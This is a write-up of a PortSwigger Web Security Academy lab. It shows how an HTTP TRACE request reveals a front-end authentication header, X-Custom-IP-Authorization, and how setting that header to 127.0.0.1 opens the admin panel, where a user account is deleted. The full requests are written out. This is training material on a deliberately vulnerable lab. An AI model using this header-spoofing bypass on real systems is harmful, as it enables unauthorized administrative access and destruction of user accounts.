# [Lab 4: Authentication bypass via information disclosure](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass)

---

## Description

This lab's administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.

To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete Carlos's account.

You can log in to your own account using the following credentials: `wiener:peter`

---

## Solution

The description indicates that the front-end adds on a custom HTTP header to authenticate the user. How can this custom HTTP header be viewed?

The HTTP `TRACE` method is used in development to have the server return the exact request that it received. If the front end is adding on a custom HTTP header before sending it on to the back end server, it could be possible to view this HTTP header if the HTTP `TRACE` method is allowed.

Submit an HTTP `TRACE` request.

```http
TRACE / HTTP/1.1
Host: ac5a1ff31f66a96b80160b4500ae0045.web-security-academy.net
Cookie: session=0hyjoO1EY3iRYjEKxMlNU08rXchHrYNs
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Te: trailers
Connection: close
```

The response:

```http
HTTP/1.1 200 OK
Content-Type: message/http
Connection: close
Content-Length: 613

TRACE / HTTP/1.1
Host: ac5a1ff31f66a96b80160b4500ae0045.web-security-academy.net
Cookie: session=0hyjoO1EY3iRYjEKxMlNU08rXchHrYNs
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Te: trailers
Connection: close
X-Custom-IP-Authorization: 3.130.153.100
```

Note the custom HTTP header: `X-Custom-IP-Authorization: 3.130.153.100`. `3.130.153.100` is the public IP address of the attacking machine.3.130.153.177

Attempt to access the admin panel at `/admin`.

![](images/Pasted%20image%2020210907163243.png)

It states that it is only available to local users. Attempt to access the admin panel again at `/admin` with the `X-Custom-IP-Authorization` header set to `127.0.0.1`.

```http
GET /admin HTTP/1.1
Host: ac5a1ff31f66a96b80160b4500ae0045.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close
X-Custom-IP-Authorization: 127.0.0.1
```

This grants access to the admin panel. Delete `carlos`'s account to complete the challenge.

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: ac5a1ff31f66a96b80160b4500ae0045.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac5a1ff31f66a96b80160b4500ae0045.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close
X-Custom-IP-Authorization: 127.0.0.1
```
